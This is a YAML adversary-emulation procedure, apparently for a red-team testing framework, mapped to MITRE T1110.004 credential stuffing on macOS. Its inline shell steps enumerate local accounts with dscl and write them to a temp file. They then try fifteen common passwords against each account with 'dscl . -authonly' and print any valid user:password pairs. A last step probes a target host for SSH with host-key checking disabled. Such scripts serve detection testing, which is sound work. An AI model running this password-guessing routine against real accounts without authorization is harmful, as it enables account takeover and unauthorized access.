---
api_version: 2.0
uuid: 34c3a0e7-6b9d-5e50-1c4d-3f8a1b1e5d7c
name: Credential Stuffing
authors:
- Claude Code
description: |
  Perform credential stuffing against macOS local accounts and services. Enumerates local
  user accounts, attempts authentication with common credential pairs via dscl authonly,
  and checks SSH authentication availability on the target host.
mitre:
  tactics:
  - TA0001 Initial Access
  techniques:
  - T1110 Brute Force
  subtechniques:
  - 'T1110.004 Brute Force: Credential Stuffing'
requirements:
  platforms:
  - os: darwin
args:
- name: target_host
  description: Target host for credential stuffing attempts
  type: string
  default: localhost
steps:
- name: enumerate_local_accounts
  description: Enumerate all local user accounts that could be targeted
  inline: |
    echo "=== Enumerating Local User Accounts ==="
    dscl . -list /Users | grep -v '^_' | while read -r user; do
      uid=$(dscl . -read /Users/"$user" UniqueID 2>/dev/null | awk '{print $2}')
      if [ -n "$uid" ] && [ "$uid" -ge 500 ]; then
        realname=$(dscl . -read /Users/"$user" RealName 2>/dev/null | tail -1 | xargs)
        echo "Target account: $user (Name: $realname, UID: $uid)"
      fi
    done
    # Save account list for next step
    dscl . -list /Users | grep -v '^_' | while read -r user; do
      uid=$(dscl . -read /Users/"$user" UniqueID 2>/dev/null | awk '{print $2}')
      if [ -n "$uid" ] && [ "$uid" -ge 500 ]; then
        echo "$user"
      fi
    done > /tmp/ttp_stuffing_accounts.txt
    echo "Found $(wc -l < /tmp/ttp_stuffing_accounts.txt | tr -d ' ') targetable accounts"
- name: attempt_credential_stuffing
  description: Attempt authentication with common credential pairs against all enumerated accounts
  inline: |
    echo "=== Credential Stuffing Against Local Accounts ==="
    # Common leaked credential passwords
    common_passwords=("password" "123456" "password123" "admin" "letmein" "welcome" "monkey" "dragon" "master" "qwerty" "login" "abc123" "starwars" "trustno1" "passw0rd")
    total_attempts=0
    successes=0
    while IFS= read -r user; do
      [ -z "$user" ] && continue
      for pw in "${common_passwords[@]}"; do
        total_attempts=$((total_attempts + 1))
        result=$(dscl . -authonly "$user" "$pw" 2>&1)
        if [ $? -eq 0 ]; then
          echo "CRITICAL: Valid credentials found - $user:$pw"
          successes=$((successes + 1))
        fi
      done
      echo "Completed stuffing for account: $user"
    done < /tmp/ttp_stuffing_accounts.txt
    echo "=== Credential Stuffing Summary ==="
    echo "Total attempts: $total_attempts"
    echo "Successful authentications: $successes"
- name: check_ssh_availability
  description: Check if SSH authentication is available on the target host
  inline: |
    echo "=== Checking SSH Availability on '{{ .Args.target_host }}' ==="
    ssh_result=$(ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no {{ .Args.target_host }} exit 2>&1)
    ssh_exit=$?
    echo "SSH probe result (exit code $ssh_exit):"
    echo "$ssh_result"
    if echo "$ssh_result" | grep -q "Permission denied"; then
      echo "SSH is available but requires authentication - credential stuffing over SSH is possible"
    elif echo "$ssh_result" | grep -q "Connection refused"; then
      echo "SSH service is not running or is blocked on {{ .Args.target_host }}"
    elif [ $ssh_exit -eq 0 ]; then
      echo "WARNING: SSH connected without password (key-based auth or no auth required)"
    else
      echo "SSH connection status: $ssh_result"
    fi
  cleanup:
    inline: |
      echo "Removing temporary account list"
      rm -f /tmp/ttp_stuffing_accounts.txt
tests:
- name: dry_run_test
  dry_run: true
